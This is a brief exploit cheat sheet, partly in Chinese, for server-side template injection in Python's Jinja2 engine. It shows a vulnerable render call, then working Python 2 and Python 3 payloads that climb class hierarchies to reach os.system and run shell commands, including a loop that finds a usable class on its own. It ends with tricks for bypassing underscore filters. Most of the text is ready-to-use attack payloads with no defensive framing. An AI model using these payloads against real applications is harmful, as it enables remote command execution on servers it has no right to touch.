# Python Jinja

## Installation

```sh
$ pip install jinja2
```

## Vulnerable Code

```python
from jinja2 import Environment
Jinja2 = Environment()
Jinja2.from_string('<code-here>').render()
```

## Exploit

```python
py2 payload: 
 -> ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].__dict__['system']('ls')
py3 payload: 
 -> ''.__class__.__mro__[1].__subclasses__()[80].__init__.__globals__['__import__']('os').system('ls')

ps. 因為不能直接找到 RCE module, 建議先用 

''.__class__.__mro__[1].__subclasses__() 
or
''.__class__.__mro__[2].__subclasses__()

看看有沒可用的 class

善用迴圈的版本(不需要手動找)
{% for x in ().__class__.__base__.__subclasses__() %}
{% if "warning" in x.__name__ %}
{{x()._module.__builtins__['__import__']('os').system("ls")}}
{% endif %}
{% endfor %}
```

## Bypass

```
1. ''['__class__'] 取代 ''.__class__
2. filter  {{ ''|attr(['_'*2,'class','_'*2]|join) }}
如果要用[]要分段寫 {% set a = ''|attr(['_'*2,'class','_'*2]|join) %} {% a[1] %}
```



